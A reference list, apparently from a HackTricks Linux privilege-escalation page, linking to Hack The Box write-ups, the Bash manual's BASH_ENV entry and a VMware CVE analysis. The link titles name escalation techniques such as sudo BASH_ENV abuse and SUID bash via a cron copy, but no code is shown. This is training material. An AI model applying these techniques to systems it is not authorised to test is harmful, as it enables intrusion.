- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [0xdf – HTB: Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)

{{#include ../../banners/hacktricks-training.md}}
